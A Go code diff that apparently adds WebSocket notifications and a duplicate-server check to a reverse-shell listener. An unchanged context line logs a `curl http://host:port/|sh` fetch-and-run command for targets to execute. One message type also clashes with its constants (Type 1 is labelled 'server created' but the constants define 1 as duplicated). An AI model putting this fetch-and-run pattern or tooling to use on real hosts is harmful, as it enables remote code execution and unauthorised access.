@@ -2,6 +2,7 @@ package context
 
 import (
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"net"
 	"os"
@@ -16,6 +17,10 @@ import (
 	"github.com/jedib0t/go-pretty/table"
 )
 
+type WebSocketMessage struct {
+	Type WebSocketMessageType
+	Data interface{}
+}
 type TCPServer struct {
 	Host          string                  `json:"host"`
 	GroupDispatch bool                    `json:"group_dispatch"`
@@ -27,7 +32,14 @@ type TCPServer struct {
 }
 
 func CreateTCPServer(host string, port uint16, hashFormat string) *TCPServer {
-	return &TCPServer{
+	service := fmt.Sprintf("%s:%d", host, port)
+
+	if Ctx.Servers[hash.MD5(service)] != nil {
+		log.Error("The server (%s) already exists", service)
+		return nil
+	}
+
+	tcpServer := &TCPServer{
 		Host:          host,
 		Port:          port,
 		GroupDispatch: true,
@@ -36,6 +48,8 @@ func CreateTCPServer(host string, port uint16, hashFormat string) *TCPServer {
 		hashFormat:    hashFormat,
 		stopped:       make(chan struct{}, 1),
 	}
+	Ctx.Servers[hash.MD5(service)] = tcpServer
+	return tcpServer
 }
 
 func (s *TCPServer) Hash() string {
@@ -131,6 +145,12 @@ func (s *TCPServer) Run() {
 	} else {
 		log.Warn("\t`curl http://%s:%d/|sh`", s.Host, s.Port)
 	}
+
+	msg, _ := json.Marshal(WebSocketMessage{
+		Type: 1, // 0 for client online, 1 for server created
+		Data: s,
+	})
+	Ctx.NotifyWebSocket.Broadcast(msg)
 
 	for {
 		select {
@@ -247,6 +267,13 @@ func (s *TCPServer) Stop() {
 	}
 }
 
+type WebSocketMessageType int
+
+const (
+	CLIENT_CONNECTED WebSocketMessageType = iota
+	CLIENT_DUPLICATED
+)
+
 func (s *TCPServer) AddTCPClient(client *TCPClient) {
 	client.GroupDispatch = s.GroupDispatch
 	log.Debug("Gathering information from client...")
@@ -260,10 +287,38 @@ func (s *TCPServer) AddTCPClient(client *TCPClient) {
 	client.Mature = true
 	if _, exists := s.Clients[client.Hash]; exists {
 		log.Error("Duplicated income connection detected!")
+		// WebSocket Broadcast
+		type ClientDuplicateMessage struct {
+			Client     TCPClient
+			ServerHash string
+		}
+		msg, _ := json.Marshal(WebSocketMessage{
+			Type: CLIENT_DUPLICATED, // 0 for client online
+			Data: ClientDuplicateMessage{
+				Client:     *client,
+				ServerHash: s.Hash(),
+			},
+		})
+		// Notify to all websocket clients
+		Ctx.NotifyWebSocket.Broadcast(msg)
 		client.Close()
 	} else {
 		log.Success("Fire in the hole: %s", client.OnelineDesc())
 		s.Clients[client.Hash] = client
+		// WebSocket Broadcast
+		type ClientOnlineMessage struct {
+			Client     TCPClient
+			ServerHash string
+		}
+		msg, _ := json.Marshal(WebSocketMessage{
+			Type: CLIENT_CONNECTED, // 0 for client online
+			Data: ClientOnlineMessage{
+				Client:     *client,
+				ServerHash: s.Hash(),
+			},
+		})
+		// Notify to all websocket clients
+		Ctx.NotifyWebSocket.Broadcast(msg)
 	}
 }
 
